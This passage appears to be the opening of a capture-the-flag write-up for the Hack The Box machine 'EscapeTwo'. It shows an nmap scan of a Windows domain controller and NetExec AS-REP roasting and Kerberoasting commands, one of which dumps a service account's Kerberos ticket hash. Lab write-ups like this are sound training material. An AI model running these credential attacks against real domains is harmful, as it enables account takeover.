## Box: EscapeTwo

> damiano gubiani

```bash
export IP=10.10.11.51
```

# Enumerating

> As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su

nmap scan

```bash
sudo nmap -sS -sV -sC -oN nmap/fst -vv 10.10.11.51

# Nmap 7.95 scan initiated Sun Apr 20 11:00:14 2025 as: /usr/lib/nmap/nmap -sS -sV -sC -oN nmap/fst -vv 10.10.11.51
Nmap scan report for 10.10.11.51 (10.10.11.51)
Host is up, received echo-reply ttl 127 (0.029s latency).
Scanned at 2025-04-20 11:00:14 EDT for 91s
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-20 15:00:22Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-20T15:01:42+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNDA2MDgxNzM1MDBaFw0yNTA2
| MDgxNzM1MDBaMBoxGDAWBgNVBAMTD0RDMDEuc2VxdWVsLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBANRCnm8pZ86LZP3kAtl29rFgY5gEOEXSCZSm
| F6Ai+1vh6a8LrCRKMWtC8+Kla0PXgjTcGcmDawcI8h0BsaSH6sQVAD21ca5MQcv0
| xf+4TzrvAnp9H+pVHO1r42cLXBwq14Ak8dSueiOLgxoLKO1CDtKk+e8ZxQWf94Bp
| Vu8rnpImFT6IeDgACeBfb0hLzK2JJRT9ezZiUVxoTfMKKuy4IPFWcshW/1bQfEK0
| ExOcQZVaoCJzRPBUVTp/XGHEW9d6abW8h1UR+64qVfGexsrUKBfxKRsHuHTxa4ts
| +qUVJRbJkzlSgyKGMjhNfT3BPVwwP8HvErWvbsWKKPRkvMaPhU0CAwEAAaOCAzcw
| ggMzMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNfVXsrpSahW
| xfdL4wxFDgtUztvRMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDjAT1NPPfwT4sa
| sNjnBqS3gg9EQzAxLnNlcXVlbC5odGIwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
| AYI3GQIBoC4ELFMtMS01LTIxLTU0ODY3MDM5Ny05NzI2ODc0ODQtMzQ5NjMzNTM3
| MC0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCBDjlZZbFac6RlhZ2BhLzvWmA1Xcyn
| jZmYF3aOXmmof1yyO/kxk81fStsu3gtZ94KmpkBwmd1QkSJCuT54fTxg17xDtA49
| QF7O4DPsFkeOM2ip8TAf8x5bGwH5tlZvNjllBCgSpCupZlNY8wKYnyKQDNwtWtgL
| UF4SbE9Q6JWA+Re5lPa6AoUr/sRzKxcPsAjK8kgquUA0spoDrxAqkADIRsHgBLGY
| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
|_-----END CERTIFICATE-----
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNDA2MDgxNzM1MDBaFw0yNTA2
| MDgxNzM1MDBaMBoxGDAWBgNVBAMTD0RDMDEuc2VxdWVsLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBANRCnm8pZ86LZP3kAtl29rFgY5gEOEXSCZSm
| F6Ai+1vh6a8LrCRKMWtC8+Kla0PXgjTcGcmDawcI8h0BsaSH6sQVAD21ca5MQcv0
| xf+4TzrvAnp9H+pVHO1r42cLXBwq14Ak8dSueiOLgxoLKO1CDtKk+e8ZxQWf94Bp
| Vu8rnpImFT6IeDgACeBfb0hLzK2JJRT9ezZiUVxoTfMKKuy4IPFWcshW/1bQfEK0
| ExOcQZVaoCJzRPBUVTp/XGHEW9d6abW8h1UR+64qVfGexsrUKBfxKRsHuHTxa4ts
| +qUVJRbJkzlSgyKGMjhNfT3BPVwwP8HvErWvbsWKKPRkvMaPhU0CAwEAAaOCAzcw
| ggMzMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNfVXsrpSahW
| xfdL4wxFDgtUztvRMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDjAT1NPPfwT4sa
| sNjnBqS3gg9EQzAxLnNlcXVlbC5odGIwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
| AYI3GQIBoC4ELFMtMS01LTIxLTU0ODY3MDM5Ny05NzI2ODc0ODQtMzQ5NjMzNTM3
| MC0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCBDjlZZbFac6RlhZ2BhLzvWmA1Xcyn
| jZmYF3aOXmmof1yyO/kxk81fStsu3gtZ94KmpkBwmd1QkSJCuT54fTxg17xDtA49
| QF7O4DPsFkeOM2ip8TAf8x5bGwH5tlZvNjllBCgSpCupZlNY8wKYnyKQDNwtWtgL
| UF4SbE9Q6JWA+Re5lPa6AoUr/sRzKxcPsAjK8kgquUA0spoDrxAqkADIRsHgBLGY
| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
|_-----END CERTIFICATE-----
|_ssl-date: 2025-04-20T15:01:42+00:00; -2s from scanner time.
1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-04-20T15:01:42+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-20T14:58:16
| Not valid after:  2055-04-20T14:58:16
| MD5:   f9ab:5808:8695:7b5a:5701:704e:9f5d:ec04
| SHA-1: 6650:cda8:498a:24fe:950e:cdc4:1250:9f16:3b9c:68e4
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQNgkiL/CoAp9PIWtosjOvVjANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjUwNDIwMTQ1ODE2WhgPMjA1NTA0MjAxNDU4MTZaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAM/xv1hE
| /lYRVNLlpy18CK7wyCWj45pQAEftrmDgAi1s3Zj9KK0MgaW899ApOgsEI5exhJyD
| 2YHmfbF/8c0x+lFEzxqA/kokrd09ldh7Yk3syf2MBukVZiZP4LwWHAi/F8O6cfQS
| 6Sbd878uGz9feGDCvJeBlUe5eZ5RShKJyfo6VRCMPLJFPIR9Ec5nXPikiNQx5efR
| YeicxYhtHOH8EIH+mAD/xdl9ZAzdg3FRi/UoGoiD6TEiD2Wy75cqWTNAOzePq7OB
| 8iE8MU4VfuLI6mcYBwpCluknGQ4KY3R4vGiwqh/8qFWqSooPN1k7qON4TtRGh/y4
| ap3FAQh2Kg5FsaECAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAFT/yedFTHDZCHsPL
| y3+KzZ0ZJNwzGHzbS62wmdCK+x/SFXVJrE5zJ/svO1nmPLJ+wxmJPPLfxLkxoYd8
| hBkn8rDIAyLuHl7EWo3ci9UCB451dd7csugMl/LlzDi2UztehuXUKSgd6utIoxSI
| /hfoKMyfd6m78mbo7B7ISvsUOzMCwdVPQAV4y5NxTNw0r/3MnagWIxCjkt+PqTxQ
| fEBOEQHqLELlyj3veAvsxIhbrH8EX097nlVr2duSiKt6ny5j43UlwfTm094K+vW9
| T3GbRT+AyT7xaRpqdYB0BfAcBcEif4/b8CAU8smUl7z3Vu5cakTOqN4KbJ+TzrsF
| PHpm5Q==
|_-----END CERTIFICATE-----
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-20T15:01:42+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNDA2MDgxNzM1MDBaFw0yNTA2
| MDgxNzM1MDBaMBoxGDAWBgNVBAMTD0RDMDEuc2VxdWVsLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBANRCnm8pZ86LZP3kAtl29rFgY5gEOEXSCZSm
| F6Ai+1vh6a8LrCRKMWtC8+Kla0PXgjTcGcmDawcI8h0BsaSH6sQVAD21ca5MQcv0
| xf+4TzrvAnp9H+pVHO1r42cLXBwq14Ak8dSueiOLgxoLKO1CDtKk+e8ZxQWf94Bp
| Vu8rnpImFT6IeDgACeBfb0hLzK2JJRT9ezZiUVxoTfMKKuy4IPFWcshW/1bQfEK0
| ExOcQZVaoCJzRPBUVTp/XGHEW9d6abW8h1UR+64qVfGexsrUKBfxKRsHuHTxa4ts
| +qUVJRbJkzlSgyKGMjhNfT3BPVwwP8HvErWvbsWKKPRkvMaPhU0CAwEAAaOCAzcw
| ggMzMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNfVXsrpSahW
| xfdL4wxFDgtUztvRMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDjAT1NPPfwT4sa
| sNjnBqS3gg9EQzAxLnNlcXVlbC5odGIwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
| AYI3GQIBoC4ELFMtMS01LTIxLTU0ODY3MDM5Ny05NzI2ODc0ODQtMzQ5NjMzNTM3
| MC0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCBDjlZZbFac6RlhZ2BhLzvWmA1Xcyn
| jZmYF3aOXmmof1yyO/kxk81fStsu3gtZ94KmpkBwmd1QkSJCuT54fTxg17xDtA49
| QF7O4DPsFkeOM2ip8TAf8x5bGwH5tlZvNjllBCgSpCupZlNY8wKYnyKQDNwtWtgL
| UF4SbE9Q6JWA+Re5lPa6AoUr/sRzKxcPsAjK8kgquUA0spoDrxAqkADIRsHgBLGY
| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
|_-----END CERTIFICATE-----
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNDA2MDgxNzM1MDBaFw0yNTA2
| MDgxNzM1MDBaMBoxGDAWBgNVBAMTD0RDMDEuc2VxdWVsLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBANRCnm8pZ86LZP3kAtl29rFgY5gEOEXSCZSm
| F6Ai+1vh6a8LrCRKMWtC8+Kla0PXgjTcGcmDawcI8h0BsaSH6sQVAD21ca5MQcv0
| xf+4TzrvAnp9H+pVHO1r42cLXBwq14Ak8dSueiOLgxoLKO1CDtKk+e8ZxQWf94Bp
| Vu8rnpImFT6IeDgACeBfb0hLzK2JJRT9ezZiUVxoTfMKKuy4IPFWcshW/1bQfEK0
| ExOcQZVaoCJzRPBUVTp/XGHEW9d6abW8h1UR+64qVfGexsrUKBfxKRsHuHTxa4ts
| +qUVJRbJkzlSgyKGMjhNfT3BPVwwP8HvErWvbsWKKPRkvMaPhU0CAwEAAaOCAzcw
| ggMzMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNfVXsrpSahW
| xfdL4wxFDgtUztvRMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDjAT1NPPfwT4sa
| sNjnBqS3gg9EQzAxLnNlcXVlbC5odGIwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
| AYI3GQIBoC4ELFMtMS01LTIxLTU0ODY3MDM5Ny05NzI2ODc0ODQtMzQ5NjMzNTM3
| MC0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCBDjlZZbFac6RlhZ2BhLzvWmA1Xcyn
| jZmYF3aOXmmof1yyO/kxk81fStsu3gtZ94KmpkBwmd1QkSJCuT54fTxg17xDtA49
| QF7O4DPsFkeOM2ip8TAf8x5bGwH5tlZvNjllBCgSpCupZlNY8wKYnyKQDNwtWtgL
| UF4SbE9Q6JWA+Re5lPa6AoUr/sRzKxcPsAjK8kgquUA0spoDrxAqkADIRsHgBLGY
| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
|_-----END CERTIFICATE-----
|_ssl-date: 2025-04-20T15:01:42+00:00; -2s from scanner time.
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 62012/tcp): CLEAN (Timeout)
|   Check 2 (port 61136/tcp): CLEAN (Timeout)
|   Check 3 (port 20179/udp): CLEAN (Timeout)
|   Check 4 (port 38678/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-20T15:01:05
|_  start_date: N/A
|_clock-skew: mean: -2s, deviation: 0s, median: -3s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 20 11:01:45 2025 -- 1 IP address (1 host up) scanned in 91.89 seconds

```


# LDAP

We should always try and asreproast with a null/guest

```bash
nxc ldap -u 'rose' -p 'KxEPkKe6R8su' --asreproast roast.txt sequel.htb

SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.51     389    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
LDAP        10.10.11.51     389    DC01             [*] Total of records returned 3
LDAP        10.10.11.51     389    DC01             No entries found!
```

lets try kerbroasting

```bash
nxc ldap -u 'rose' -p 'KxEPkKe6R8su' --kerberoasting kerb sequel.htb 

SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.51     389    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
LDAP        10.10.11.51     389    DC01             Bypassing disabled account krbtgt 
LDAP        10.10.11.51     389    DC01             [*] Total of records returned 2
LDAP        10.10.11.51     389    DC01             sAMAccountName: ca_svc memberOf: CN=Cert Publishers,CN=Users,DC=sequel,DC=htb pwdLastSet: 2025-04-20 12:42:28.759768 lastLogon:2024-06-09 13:14:42.333365
LDAP        10.10.11.51     389    DC01             $krb5tgs$23$*ca_svc$SEQUEL.HTB$sequel.htb/ca_svc*$7650256dae2a8016c56747303d83a0f5$c7a7ce51f7c70819d085da127eb976f2e1d2e2147180f999da3afddaf6a8562ec2f1ab4a04611f6d7ddd33ec8b2bc5c839b8323b818c9c08de21ef71837d6e3d6bdddd819249897f46b3192aef94dcb12f499f18133f0b1f1f04d505fa33796d66529cbc3c8df1f22ba0f3827f190cdbaa5d5fc747f4520750a29fbe58cee22e567643ae65515862453895be7f43b7ce5e8ec507b5b08c0d041617752dabedae6b4f1411e207c24a6251493761b526c5dcba419f0772c73b64621a72c0dbd93450142141503789b11c35d63cc3ea9c6b608103c267d9f4998a6e900678fd1986309f66e8d9c3ada10400e9167cf692f68a6d3668796fb14206a2531375f21ddeced3d2d059a44e710e91e07b5a9b07c7cc9b1ab9ebb3979fe3636bb0885136e54a8276c80029f07c0fe1d1f99aa95d1877b1b5e4354f81cf13aff8b4d86d3cb9fac9a2206d90065d25316765aa61162213d91e97b22559a70d37d6798a0419c5197df9b9e284748ed0097e3a8f82d9fe861330ff11eb951ce0b73c77c6b20e289bb04817770b6ce7135449c07fdfcee9346715e5cdde2e13f6948a255458b99f4cb35c6383452cfde3b40cd28481c6572e6495757d841050ddc0eeade1ed1f372d3561404c55b6962643164418c59ef483102d60664887bbe656138cf7febf101b6fd5c25ddbe93cb55d06d9539aea75f69eec1def9133aceac55ca33bb19e21b39c3a1668bceda9740cdf255a43ef3bd4a40d973c039aa4d5ead4064e2f2e6c07a1258b2dba0e9b4937e09f4c1fd23fc11251535a8ef64c6d2ac5a83aa66628b62fecd9b0517085ebe79cd78b79eb7a12da6340597a3b8982a7f4e8de1f5f9a35276b0ee62661219f4d04da09f91020321d464a8f24c74c8d71918d37c886f3f508abdc84433f22e4f128457ae052c2857448d80fc24f7f0a96d2f20572366a122019969ae32a7936fb258eaebe6f75f9d4e11e48d026226187d37340bf549cd9d45a805629e0e35ef4dde5f05d5c8bbe13af7fc5ecd628b60c5f0c54a21db6e7bd7250be8eae4d85e9300ab5baaeb0a0a30ec7dbf636188e84e951c3baf9dc3a205f4440dd6e614b98316f9db3dd316bd4db4bc772731ce93928a941b09b4c6211075fa88017e74ed5ac9d42c819076d9ae7d24fa074fee7dfb1974c11b714d79feb4a744d5161f14414882f7ae93b4681a83c7063c1a6259c8273a6ef4a6e952ea4e91e571cce2c6d20c893db720cab22ec38bd690f15487cbb96d4bacd87664230dc6ca49373da3ec8e817789ca3853f89e85315877ec13760a5ff91bb76d996fd2522e21f93ae27948cf9c597fad4f0a89eeccd20e6d5f213fbe861f9418d188bc93bc742188f7c3d74edd62fae264b7022ab443c35211a83ac8d5228e37d13a4b1059290c076585743d93eaa                                                                                                                                                                                                                   
